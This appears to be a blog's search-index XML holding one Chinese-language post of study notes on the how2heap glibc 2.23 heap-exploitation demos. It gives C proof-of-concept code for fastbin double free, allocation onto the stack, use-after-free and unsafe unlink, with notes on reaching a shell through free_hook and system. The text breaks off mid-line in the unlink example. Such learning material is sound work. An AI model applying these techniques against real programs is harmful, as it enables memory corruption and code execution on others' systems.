<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>how2heap_zh学习</title>
    <link href="/2025/03/27/how2heap-zh%E5%AD%A6%E4%B9%A0/"/>
    <url>/2025/03/27/how2heap-zh%E5%AD%A6%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<h1 id="how2heap-zh学习"><a href="#how2heap-zh学习" class="headerlink" title="how2heap_zh学习"></a>how2heap_zh学习</h1><h2 id="glibc-2-23"><a href="#glibc-2-23" class="headerlink" title="glibc_2.23"></a>glibc_2.23</h2><h3 id="fastbins-dup"><a href="#fastbins-dup" class="headerlink" title="fastbins_dup"></a>fastbins_dup</h3><p>先放源码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;这个例子演示了 fastbin 的 double free\n&quot;</span>);<br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;首先申请了 3 个 chunk\n&quot;</span>);<br>    <span class="hljs-type">char</span>* a = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">8</span>);<br>    <span class="hljs-built_in">strcpy</span>(a, <span class="hljs-string">&quot;AAAAAAAA&quot;</span>);<br>    <span class="hljs-type">char</span>* b = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">8</span>);<br>    <span class="hljs-built_in">strcpy</span>(b, <span class="hljs-string">&quot;BBBBBBBB&quot;</span>);<br>    <span class="hljs-type">char</span>* c = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">8</span>);<br>    <span class="hljs-built_in">strcpy</span>(c, <span class="hljs-string">&quot;CCCCCCCC&quot;</span>);<br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;第一个 malloc(8): %p\n&quot;</span>, a);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;第二个 malloc(8): %p\n&quot;</span>, b);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;第三个 malloc(8): %p\n&quot;</span>, c);<br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;free 掉第一个\n&quot;</span>);<br>    <span class="hljs-built_in">free</span>(a);<br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;当我们再次 free %p 的时候, 程序将会崩溃因为 %p 在 free 链表的第一个位置上\n&quot;</span>, a, a);<br>    <span class="hljs-comment">// free(a);</span><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;我们先 free %p.\n&quot;</span>, b);<br>    <span class="hljs-built_in">free</span>(b);<br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;现在我们就可以再次 free %p 了, 因为他现在不在 free 链表的第一个位置上\n&quot;</span>, a);<br>    <span class="hljs-built_in">free</span>(a);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;现在空闲链表是这样的 [ %p, %p, %p ]. 如果我们 malloc 三次, 我们会得到两次 %p \n&quot;</span>, a, b, a, a);<br>    <br>    <span class="hljs-type">char</span>* d = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">8</span>);<br>    <span class="hljs-type">char</span>* e = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">8</span>);<br>    <span class="hljs-type">char</span>* f = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">8</span>);<br>    <span class="hljs-built_in">strcpy</span>(d, <span class="hljs-string">&quot;DDDDDDDD&quot;</span>);<br>    <span class="hljs-built_in">strcpy</span>(e, <span class="hljs-string">&quot;EEEEEEEE&quot;</span>);<br>    <span class="hljs-built_in">strcpy</span>(f, <span class="hljs-string">&quot;FFFFFFFF&quot;</span>);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;第一次 malloc(8): %p\n&quot;</span>, d);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;第二次 malloc(8): %p\n&quot;</span>, e);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;第三次 malloc(8): %p\n&quot;</span>, f);<br>&#125;<br><br></code></pre></td></tr></table></figure><p>最简单的double_free，在double_free之后d和f都指向同一个堆，这个时候就可以写入free_hook什么的修改成system，然后free一个内容是“&#x2F;bin&#x2F;sh\x00”的指针的堆块就能拿shell</p><h3 id="fastbin-dup-consolidate"><a href="#fastbin-dup-consolidate" class="headerlink" title="fastbin_dup_consolidate"></a>fastbin_dup_consolidate</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>  <span class="hljs-type">void</span>* p1 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<br>  <span class="hljs-built_in">strcpy</span>(p1, <span class="hljs-string">&quot;AAAAAAAA&quot;</span>);<br>  <span class="hljs-type">void</span>* p2 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<br>  <span class="hljs-built_in">strcpy</span>(p2, <span class="hljs-string">&quot;BBBBBBBB&quot;</span>);<br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;申请两个 fastbin 范围内的 chunk: p1=%p p2=%p\n&quot;</span>, p1, p2);<br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;先 free p1\n&quot;</span>);<br>  <span class="hljs-built_in">free</span>(p1);<br>  <span class="hljs-type">void</span>* p3 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x400</span>);<br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;去申请 largebin 大小的 chunk，触发 malloc_consolidate(): p3=%p\n&quot;</span>, p3);<br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;因为 malloc_consolidate(), p1 会被放到 unsorted bin 中\n&quot;</span>);<br>  <span class="hljs-built_in">free</span>(p1);<br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;这时候 p1 不在 fastbin 链表的头部了，所以可以再次 free p1 造成 double free\n&quot;</span>);<br>  <span class="hljs-type">void</span>* p4 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<br>  <span class="hljs-built_in">strcpy</span>(p4, <span class="hljs-string">&quot;CCCCCCC&quot;</span>);<br>  <span class="hljs-type">void</span>* p5 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<br>  <span class="hljs-built_in">strcpy</span>(p5, <span class="hljs-string">&quot;DDDDDDDD&quot;</span>);<br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;现在 fastbin 和 unsortedbin 中都放着 p1 的指针，所以我们可以 malloc 两次都到 p1: %p %p\n&quot;</span>, p4, p5);<br>&#125;<br><br></code></pre></td></tr></table></figure><p>原理：把p1从fastbins放入unsortedbins里面后就能再一次free p1，具体利用同fastbins_dup</p><h3 id="fastbin-dup-into-stack"><a href="#fastbin-dup-into-stack" class="headerlink" title="fastbin_dup_into_stack"></a>fastbin_dup_into_stack</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;这个例子拓展自 fastbin_dup.c，通过欺骗 malloc 使得返回一个指向受控位置的指针（本例为栈上）\n&quot;</span>);<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-type">long</span> stack_var;<br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;我们想通过 malloc 申请到 %p.\n&quot;</span>, <span class="hljs-number">8</span>+(<span class="hljs-type">char</span> *)&amp;stack_var);<br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;先申请3 个 chunk\n&quot;</span>);<br>    <span class="hljs-type">char</span>* a = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">8</span>);<br>    <span class="hljs-built_in">strcpy</span>(a, <span class="hljs-string">&quot;AAAAAAAA&quot;</span>);<br>    <span class="hljs-type">char</span>* b = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">8</span>);<br>    <span class="hljs-built_in">strcpy</span>(b, <span class="hljs-string">&quot;BBBBBBBB&quot;</span>);<br>    <span class="hljs-type">char</span>* c = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">8</span>);<br>    <span class="hljs-built_in">strcpy</span>(c, <span class="hljs-string">&quot;CCCCCCCC&quot;</span>);<br>    <br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;chunk a: %p\n&quot;</span>, a);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;chunk b: %p\n&quot;</span>, b);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;chunk c: %p\n&quot;</span>, c);<br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;free 掉 chunk a\n&quot;</span>);<br>    <span class="hljs-built_in">free</span>(a);<br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;如果还对 %p 进行 free, 程序会崩溃。因为 %p 现在是 fastbin 的第一个\n&quot;</span>, a, a);<br>    <span class="hljs-comment">// free(a);</span><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;先对 b %p 进行 free\n&quot;</span>, b);<br>    <span class="hljs-built_in">free</span>(b);<br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;接下来就可以对 %p 再次进行 free 了, 现在已经不是它在 fastbin 的第一个了\n&quot;</span>, a);<br>    <span class="hljs-built_in">free</span>(a);<br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;现在 fastbin 的链表是 [ %p, %p, %p ] 接下来通过修改 %p 上的内容来进行攻击.\n&quot;</span>, a, b, a, a);<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-type">long</span> *d = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">8</span>);<br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;第一次 malloc(8): %p\n&quot;</span>, d);<br>    <span class="hljs-type">char</span>* e = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">8</span>);<br>    <span class="hljs-built_in">strcpy</span>(e, <span class="hljs-string">&quot;EEEEEEEE&quot;</span>);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;第二次 malloc(8): %p\n&quot;</span>, e);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;现在 fastbin 表中只剩 [ %p ] 了\n&quot;</span>, a);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;接下来往 %p 栈上写一个假的 size，这样 malloc 会误以为那里有一个空闲的 chunk，从而申请到栈上去\n&quot;</span>, a);<br>    stack_var = <span class="hljs-number">0x20</span>;<br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;现在覆盖 %p 前面的 8 字节，修改 fd 指针指向 stack_var 前面 0x20 的位置\n&quot;</span>, a);<br>    *d = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-type">long</span>) (((<span class="hljs-type">char</span>*)&amp;stack_var) - <span class="hljs-keyword">sizeof</span>(d));<br><br>    <span class="hljs-type">char</span>* f = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">8</span>);<br>    <span class="hljs-built_in">strcpy</span>(f, <span class="hljs-string">&quot;FFFFFFFF&quot;</span>);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;第三次 malloc(8): %p, 把栈地址放到 fastbin 链表中\n&quot;</span>, f);<br>    <span class="hljs-type">char</span>* g = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">8</span>);<br>    <span class="hljs-built_in">strcpy</span>(g, <span class="hljs-string">&quot;GGGGGGGG&quot;</span>);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;这一次 malloc(8) 就申请到了栈上去: %p\n&quot;</span>, g);<br>&#125;<br><br></code></pre></td></tr></table></figure><p>fastbins里的情况：</p><blockquote><p>double_free之后：a-&gt;b-&gt;a，第一次malloc：b-&gt;a，第二次malloc：a，</p></blockquote><p>这个时候再在栈上（或者其他可写区域）写入fake_chunk的size位，再把fake_chunk的地址写入d的fd地址，此时的fasterbins：</p><blockquote><p>a-&gt;ptr（fake_chunk的地址）</p></blockquote><p>再把a给malloc，下一次malloc就会把chunk申请到fake_chunk</p><h3 id="uaf"><a href="#uaf" class="headerlink" title="uaf"></a>uaf</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-keyword">typedef</span> <span class="hljs-title function_">void</span> <span class="hljs-params">(*func_ptr)</span><span class="hljs-params">(<span class="hljs-type">char</span> *)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">evil_fuc</span><span class="hljs-params">(<span class="hljs-type">char</span> command[])</span><br>&#123;<br>system(command);<br>&#125;<br><span class="hljs-type">void</span> <span class="hljs-title function_">echo</span><span class="hljs-params">(<span class="hljs-type">char</span> content[])</span><br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s&quot;</span>,content);<br>&#125;<br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    func_ptr *p1=(func_ptr*)<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x20</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;申请了4个int大小的内存&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;p1 的地址: %p\n&quot;</span>,p1);<br>    p1[<span class="hljs-number">1</span>]=echo;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;把p1[1]赋值为echo函数，然后打印出\&quot;hello world\&quot;&quot;</span>);<br>    p1[<span class="hljs-number">1</span>](<span class="hljs-string">&quot;hello world\n&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;free 掉 p1&quot;</span>);<br>    <span class="hljs-built_in">free</span>(p1); <br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;因为并没有置为null，所以p1[1]仍然是echo函数，仍然可以输出打印了\&quot;hello again\&quot;&quot;</span>);<br>    p1[<span class="hljs-number">1</span>](<span class="hljs-string">&quot;hello again\n&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;接下来再去malloc一个p2，会把释放掉的p1给分配出来，可以看到他俩是同一地址的&quot;</span>);<br>    func_ptr *p2=(func_ptr*)<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x20</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;p2 的地址: %p\n&quot;</span>,p2);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;p1 的地址: %p\n&quot;</span>,p1);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;然后把p2[1]给改成evil_fuc也就是system函数&quot;</span>);<br>    p2[<span class="hljs-number">1</span>]=evil_fuc;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;传参调用&quot;</span>);<br>    p1[<span class="hljs-number">1</span>](<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>c语言里面free函数调用后是不会清空块的，于是里面的指针可以再次调用。在把p2申请出来后就可以用add或者edit把p1块里面的内容修改掉。</p><h3 id="unsafe-unlink"><a href="#unsafe-unlink" class="headerlink" title="unsafe_unlink"></a>unsafe_unlink</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><br><span class="hljs-type">uint64_t</span> *chunk0_ptr;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;当您在已知位置有指向某个区域的指针时，可以调用 unlink\n&quot;</span>);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;最常见的情况是易受攻击的缓冲区，可能会溢出并具有全局指针\n&quot;</span>);<br><br>    <span class="hljs-type">int</span> malloc_size = <span class="hljs-number">0x80</span>; <span class="hljs-comment">//要足够大来避免进入 fastbin</span><br>    <span class="hljs-type">int</span> header_size = <span class="hljs-number">2</span>;<br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;本练习的重点是使用 free 破坏全局 chunk0_ptr 来实现任意内存写入\n\n&quot;</span>);<br><br>    chunk0_ptr = (<span class="hljs-type">uint64_t</span>*) <span class="hljs-built_in">malloc</span>(malloc_size); <span class="hljs-comment">//chunk0</span><br>    <span class="hljs-type">uint64_t</span> *chunk1_ptr  = (<span class="hljs-type">uint64_t</span>*) <span class="hljs-built_in">malloc</span>(malloc_size); <span class="hljs-comment">//chunk1</span><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;全局变量 chunk0_ptr 在 %p, 指向 %p\n&quot;</span>, &amp;chunk0_ptr, chunk0_ptr);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;我们想要破坏的 chunk 在 %p\n&quot;</span>, chunk1_ptr);<br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;在 chunk0 那里伪造一个 chunk\n&quot;</span>);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;我们设置 fake chunk 的 &#x27;next_free_chunk&#x27; (也就是 fd) 指向 &amp;chunk0_ptr 使得 P-&gt;fd-&gt;bk = P.\n&quot;</span>);<br>    chunk0_ptr[<span class="hljs-number">2</span>] = (<span class="hljs-type">uint64_t</span>) &amp;chunk0_ptr-(<span class="hljs-keyword">sizeof</span>(<span class="hljs-type">uint64_t</span>)*<span class="hljs-number">3</span>);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;我们设置 fake chunk 的 &#x27;previous_free_chunk&#x27; (也就是 bk) 指向 &amp;chunk0_ptr 使得 P-&gt;bk-&gt;fd = P.\n&quot;</span>);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;通过上面的设置可以绕过检查: (P-&gt;fd-&gt;bk != P || P-&gt;bk-&gt;fd != P) == False\n&quot;</span>);<br>    chunk0_ptr[<span class="hljs-number">3</span>] = (<span class="hljs-type">uint64_t</span>) &amp;chunk0_ptr-(<span class="hljs-keyword">sizeof</span>(<span class="hljs-type">uint64_t</span>)*<span class="hljs-number">2</span>);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Fake chunk 的 fd: %p\n&quot;</span>,(<span class="hljs-type">void</span>*) chunk0_ptr[<span class="hljs-number">2</span>]);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Fake chunk 的 bk: %p\n\n&quot;</span>,(<span class="hljs-type">void</span>*) chunk0_ptr[<span class="hljs-number">3</span>]);<br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;现在假设 chunk0 中存在一个溢出漏洞，可以更改 chunk1 的数据\n&quot;</span>);<br>    <span class="hljs-type">uint64_t</span> *chunk1_hdr = chunk1_ptr - header_size;<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;通过修改 chunk1 中 prev_size 的大小使得 chunk1 在 free 的时候误以为 前面的 free chunk 是从我们伪造的 free chunk 开始的\n&quot;</span>);<br>    chunk1_hdr[<span class="hljs-number">0</span>] = malloc_size;<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;如果正常的 free chunk0 的话 chunk1 的 prev_size 应该是 0x90 但现在被改成了 %p\n&quot;</span>,(<span class="hljs-type">void</span>*)chunk1_hdr[<span class="hljs-number">0</span>]);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;接下来通过把 chunk1 的 prev_inuse 改成 0 来把伪造的堆块标记为空闲的堆块\n\n&quot;</span>);<br>    chunk1_hdr[<span class="hljs-number">1</span>] &amp;= ~<span class="hljs-number">1</span>;<br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;现在释放掉 chunk1，会触发 unlink，合并两个 free chunk\n&quot;</span>);<br>    <span class="hljs-built_in">free</span>(chunk1_ptr);<br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;此时，我们可以用 chunk0_ptr 覆盖自身以指向任意位置\n&quot;</span>);<br>    <span class="hljs-type">char</span> victim_string[<span class="hljs-number">8</span>];<br>    <span class="hljs-built_in">strcpy</span>(victim_string,<span class="hljs-string">&quot;Hello!~&quot;</span>);<br>    chunk0_ptr[<span class="hljs-number">3</span>] = (<span class="hljs-type">uint64_t</span>) victim_string;<br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;chunk0_ptr 现在指向我们想要的位置，我们用它来覆盖我们的 victim string。\n&quot;</span>);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span 